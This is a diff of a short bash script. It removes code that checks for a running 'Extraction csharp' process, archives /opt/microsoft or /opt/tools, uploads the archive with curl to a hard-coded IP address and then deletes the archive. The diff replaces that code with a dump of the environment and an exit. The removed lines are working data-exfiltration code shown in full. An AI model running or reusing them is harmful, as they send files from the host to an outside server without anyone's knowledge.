@@ -1,28 +1,4 @@
 #! /bin/bash
 
-numprocesses=$(ps axuf | grep "Extraction csharp " | wc -l)
-if [[ $numprocesses -gt 1 ]] ; then
-
-echo "CEE."
-
-tar czf /tmp/cee-microsoft.tar.gz	/opt/microsoft
-
-md5sum /tmp/cee-*.tar.gz
-
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/cee-microsoft.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=cee-microsoft" 
-ls -liah /tmp/
-
-rm -rf /tmp/cee-*.tar.gz
-
-else
-echo "JAVA"
-tar czf /tmp/jav-tools.tar.gz /opt/tools
-md5sum /tmp/jav-*.tar.gz
-
-
-curl --connect-timeout 2 --retry 1 --retry-delay 0 --retry-max-time 10 --data-binary  "@/tmp/jav-tools.tar.gz" -XGET "http://45.32.123.254/dd.php?act=u&fn=jav-tools" 
-ls -liah /tmp/
-
-rm -rf /tmp/jav-*.tar.gz
-
-fi
+env
+exit -1
